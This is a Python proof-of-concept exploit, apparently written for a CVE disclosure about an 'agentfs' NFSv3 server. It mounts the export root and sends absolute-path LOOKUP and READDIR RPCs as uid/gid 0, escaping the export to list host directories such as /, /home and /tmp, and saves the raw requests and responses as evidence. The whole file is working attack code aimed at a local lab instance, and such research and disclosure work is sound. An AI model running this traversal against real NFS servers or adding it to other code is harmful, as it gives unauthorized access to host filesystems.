#!/usr/bin/env python3
"""NFSv3 enumeration PoC: absolute LOOKUP + READDIR of host dirs."""
import sys, json, hashlib, datetime, struct
from pathlib import Path
sys.path.insert(0, '/home/teycir/Repos/agentfs-cve/pocs')
import nfs_traversal_capture as n

HOST, PORT, UID, GID = '127.0.0.1', int(sys.argv[2]) if len(sys.argv)>2 else 11111, 0, 0
OUT = Path(sys.argv[1]) if len(sys.argv) > 1 else Path('/tmp/opencode/enum-capture')
OUT.mkdir(parents=True, exist_ok=True)
_idx = [0]

def rpc(prog, proc, body):
    r, req, resp = n.rpc(HOST, PORT, prog, 3, proc, body, UID, GID)
    _idx[0] += 1
    n.save(OUT, _idx[0], f'{proc:02d}', req, resp)
    return r, req, resp

def mnt():
    r,_,_ = rpc(100005,1,n.X().s('/'))
    st=r.u32(); fh=r.op(); assert st==0, st
    return fh

def lookup(root, name):
    r,_,_ = rpc(100003,3,n.X().op(root).s(name))
    st=r.u32()
    if st!=0: return st, None, None
    fh=r.op(); obj=r.attrs(); r.attrs()
    return st, fh, obj

def readdir_parse(r):
    # r positioned after status; dir_attributes is post_op_attr (attrs() reads follows itself)
    r.attrs()
    r.o += 8  # cookieverf (dirversion)
    entries = []
    while True:
        follows = r.u32()
        if not follows: break
        fid = r.u64(); name = r.op().decode('utf-8','replace'); cookie = r.u64()
        entries.append((name, fid, cookie))
    eof = r.u32()
    return entries, bool(eof)

def main():
    res = {"started_utc": datetime.datetime.now(datetime.timezone.utc).isoformat().replace('+00:00','Z'),
           "host": HOST, "port": PORT, "uid": UID, "gid": GID, "listings": []}
    root = mnt()
    print('[+] MNT', root.hex())
    for path in ['/', '/home', '/tmp', '/tmp/opencode/agentfs-lab']:
        st, fh, obj = lookup(root, path)
        print(f'[+] LOOKUP {path!r} status={st}' + (f' mode={oct(obj["mode"])}' if obj else ''))
        if st != 0 or fh is None: continue
        x = n.X().op(fh).u64(0); x.b += b'\x00'*8; x.u32(1<<20).u32(1<<20)
        r,_,_ = rpc(100003,16,x)
        st = r.u32()
        if st != 0:
            print('    READDIR status', st); continue
        entries, eof = readdir_parse(r)
        names = [e[0] for e in entries]
        print(f'    READDIR {len(names)} entries eof={eof}: {names[:40]}')
        res['listings'].append({"path": path, "status": st, "eof": eof,
                                "entries": [{"name": e[0], "fileid": e[1]} for e in entries]})
    res['finished_utc'] = datetime.datetime.now(datetime.timezone.utc).isoformat().replace('+00:00','Z')
    (OUT/'result.json').write_text(json.dumps(res, indent=2)+'\n')
    print('[+] evidence ->', OUT)

if __name__ == '__main__':
    main()
